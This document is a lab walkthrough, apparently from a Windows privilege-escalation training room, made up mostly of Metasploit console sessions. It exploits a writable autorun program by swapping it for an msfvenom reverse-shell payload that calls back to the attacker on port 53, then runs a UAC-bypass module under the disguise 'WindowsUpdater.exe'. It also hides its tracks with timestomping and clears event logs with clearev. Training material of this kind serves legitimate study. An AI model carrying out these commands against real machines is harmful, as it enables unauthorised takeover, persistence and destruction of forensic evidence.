# Metasploit

## 01 - Enumerate

```
meterpreter > getuid
Server username: TCM-PC\user
meterpreter > run post/windows/gather/wmic_command command="startup list full"

[*] Running module against TCM-PC
[*] Command output saved to: /root/.msf4/loot/20220526140148_default_10.10.186.6_host.command.wmi_117632.txt

userware@hackware-os:~$ sudo grep "Autorun" -A4 /root/.msf4/loot/20220526140148_default_10.10.186.6_host.command.wmi_117632.txt
Command="C:\Program Files\Autorun Program\program.exe"
Description=My Program
Location=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SettingID=
User=Public

meterpreter > reg enumkey -k "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Enumerating: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

  Values (2):

        VMware User Process
        My Program

meterpreter > reg queryval -k "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -v "My Program"
Key: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Name: My Program
Type: REG_SZ
Data: "C:\Program Files\Autorun Program\program.exe"
meterpreter > execute -Hicf "icacls \"C:\Program Files\Autorun Program\""
Process 1372 created.
Channel 17 created.
C:\Program Files\Autorun Program NT SERVICE\TrustedInstaller:(I)(F)
                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Users:(I)(RX)
                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

## 02 - Exploit

Before we touch the program we have to take notes of the timestamp to clear our tracks ahead of time. Copy and paste them in a text editor.

```
meterpreter > timestomp -v "C:\Program Files\Autorun Program\program.exe"
[*] Showing MACE attributes for C:\Program Files\Autorun Program\program.exe
Modified      : 2009-07-13 22:39:15 -0400
Accessed      : 2020-04-15 10:42:26 -0400
Created       : 2020-04-15 10:42:26 -0400
Entry Modified: 2020-04-15 10:42:26 -0400
meterpreter > download "C:\Program Files\Autorun Program\program.exe" backup
[*] Downloading: C:\Program Files\Autorun Program\program.exe -> /home/user/Documents/thm/winprivesc/backup/program.exe
[*] Downloaded 10.00 KiB of 10.00 KiB (100.0%): C:\Program Files\Autorun Program\program.exe -> /home/user/backup/program.exe
[*] download   : C:\Program Files\Autorun Program\program.exe -> /home/user/backup/program.exe

userware@hackware-os:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.145.108 lport=53 -f exe -o program.exe

msf6 > handler -p windows/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53
[*] Payload handler running as background job 2.

[*] Started reverse TCP handler on 10.8.145.108:53
msf6 > sessions -1
[*] Starting interaction with 1...
meterpreter > upload program.exe "C:\Program Files\Autorun Program\"
[*] uploading  : /home/user/backup/program.exe -> C:\Program Files\Autorun Program\
[*] uploaded   : /home/user/backup/program.exe -> C:\Program Files\Autorun Program\\program.exe
meterpreter > timestomp -v "C:\Program Files\Autorun Program\program.exe"
[*] Showing MACE attributes for C:\Program Files\Autorun Program\program.exe
Modified      : 2022-05-26 15:23:50 -0400
Accessed      : 2020-04-15 10:42:26 -0400
Created       : 2020-04-15 10:42:26 -0400
Entry Modified: 2022-05-26 15:23:50 -0400
```

This is just to simulate that an administrator user will login. The attacker must wait in order to receive a callback shell.

```
$ xfreerdp /u:"<username>" /p:"<password>" /sec:<rdp | tls | nla> /v:<IP>
```

We have elevated as part of **administrators** local group.

```
[*] Sending stage (200774 bytes) to 10.10.186.6
[*] Meterpreter session 2 opened (10.8.145.108:53 -> 10.10.186.6:49246) at 2022-05-26 14:26:27 -0400

meterpreter > sessions 2
[*] Backgrounding session 1...
[*] Starting interaction with 2...

meterpreter > getuid
Server username: TCM-PC\TCM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > execute -Hif "net" -a "user TCM"
Process 3844 created.
Channel 3 created.
User name                    TCM
Full Name
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/15/2020 9:38:12 AM
Password expires             Never
Password changeable          4/15/2020 9:38:12 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2022 2:26:12 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *HomeUsers
                             *Remote Desktop Users
Global Group memberships     *None
The command completed successfully.
```

## 03 - Cleanup

Let's migrate to another process. Create a new one if necessary.

```
meterpreter > execute -cf notepad.exe
Process 4072 created.
Channel 4 created.
meterpreter > migrate -N notepad.exe
[*] Migrating from 3624 to 4072...
[*] Migration completed successfully.
```

Upload the original binary to it's destination and modify the timestamps to clear any trace of activity.

```
meterpreter > upload backup/program.exe "C:\\Program Files\\Autorun Program\\"
[*] uploading  : /home/user/backup/program.exe -> C:\Program Files\Autorun Program\
[*] uploaded   : /home/user/backup/program.exe -> C:\Program Files\Autorun Program\\program.exe
meterpreter > timestomp -m "07/13/2009 22:39:15" "C:\Program Files\Autorun Program\program.exe"
[*] Setting specific MACE attributes on C:\Program Files\Autorun Program\program.exe
meterpreter > timestomp -e "05/26/2022 15:23:50" "C:\Program Files\Autorun Program\program.exe"
[*] Setting specific MACE attributes on C:\Program Files\Autorun Program\program.exe
meterpreter > timestomp -v "C:\Program Files\Autorun Program\program.exe"
[*] Showing MACE attributes for C:\Program Files\Autorun Program\program.exe
Modified      : 2009-07-13 23:39:15 -0400
Accessed      : 2020-04-15 11:42:26 -0400
Created       : 2020-04-15 12:42:26 -0400
Entry Modified: 2022-05-26 16:23:50 -0400
```

Despite being elevated as administrator we lack privileges to clear event logs. Let's perform privilege escalation through UAC bypass with `exploit/windows/local/ask` to provide a prompt to the target. This is a risky social engineering attempt yet as a last resort if there are no other vulnerabilities to elevate even further.

```
meterpreter > clearev
[*] Wiping 919 records from Application...
[-] stdapi_sys_eventlog_clear: Operation failed: Access is denied.
meterpreter > bg
[*] Backgrounding session 2...
msf > use exploit/windows/local/ask
msf exploit(windows/local/ask) > options

Module options (exploit/windows/local/ask):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILENAME                    no        File name on disk
   PATH                        no        Location on disk, %TEMP% used if not set
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf exploit(windows/local/ask) > set session 2

msf exploit(windows/local/ask) > set lhost 10.8.145.108

msf exploit(windows/local/ask) > set lport 53

msf exploit(windows/local/ask) > set filename WindowsUpdater.exe

msf exploit(windows/local/ask) > exploit

[*] Started reverse TCP handler on 10.8.145.108:53
[*] UAC is Enabled, checking level...
[*] The user will be prompted, wait for them to click 'Ok'
[*] Uploading WindowsUpdater.exe - 73802 bytes to the filesystem...
[*] Executing Command!
[*] Sending stage (175174 bytes) to 10.10.186.6
[*] Meterpreter session 3 opened (10.8.145.108:53 -> 10.10.186.6:49296) at 2022-05-26 14:54:59 -0400
```

We have enough privileges to clear the event logs.

```
meterpreter > getuid
Server username: TCM-PC\TCM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
meterpreter > clearev
```